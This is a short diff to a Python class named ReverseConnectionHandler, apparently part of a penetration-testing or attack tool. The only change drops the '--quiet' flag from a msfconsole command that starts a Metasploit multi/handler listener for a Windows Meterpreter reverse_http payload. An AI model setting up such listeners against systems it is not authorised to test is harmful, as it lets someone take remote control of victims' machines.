@@ -36,7 +36,7 @@ class ReverseConnectionHandler:
 
     def _msf_command(self):
         return (
-            "msfconsole --quiet --exec-command "
+            "msfconsole --exec-command "
             "\""
             "use exploit/multi/handler;"
             "set payload windows/x64/meterpreter/reverse_http;"
